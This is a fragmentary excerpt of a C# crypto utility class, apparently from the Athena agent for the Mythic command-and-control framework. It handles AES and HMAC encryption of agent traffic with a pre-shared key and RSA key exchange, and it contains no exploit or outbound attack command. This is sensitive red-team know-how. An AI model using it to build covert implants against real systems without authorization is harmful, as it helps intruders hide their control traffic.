...
namespace Athena.Utilties
{
    //Originally created by @airzero24 for the atlas agent.
    ...
    class Crypto
    {
        ...
        public static string EncryptStage(string plaintext)
        {
            using (Aes aes = Aes.Create())
            {
                ...
                aes.Key = Convert.FromBase64String(Globals.mc.MythicConfig.psk);
                ...
                using (CryptoStream encryptCryptoStream = new CryptoStream(encryptMemStream, encryptor, CryptoStreamMode.Write))
                {
                    ...
                    HMACSHA256 sha256 = new HMACSHA256(Convert.FromBase64String(Globals.mc.MythicConfig.psk));
                    // Attach hmac to iv:ciphertext
                    byte[] hmac = sha256.ComputeHash(encrypted);
                    // Attach uuid to iv:ciphertext:hmac
                    byte[] final = Encoding.UTF8.GetBytes(Globals.mc.MythicConfig.uuid).Concat(encrypted.Concat(hmac).ToArray()).ToArray();
        ...
        public static string Decrypt(string encrypted)
        {
            ...
            int uuidLength = Globals.mc.MythicConfig.uuid.Length;
        ...
        public static void GenRsaKeys()
        {
            ...
            Globals.rsa = new RSACryptoServiceProvider(4096) 
            {
        ...
        {
            Globals.rsa.ImportParameters(Globals.rsa.ExportParameters(true));
            byte[] final = Globals.rsa.Decrypt(Data, true);
            return final;
        }
        ...
        public static string GetPubKey()
        {
            ...
            ExportPublicKey(Globals.rsa, outStream);
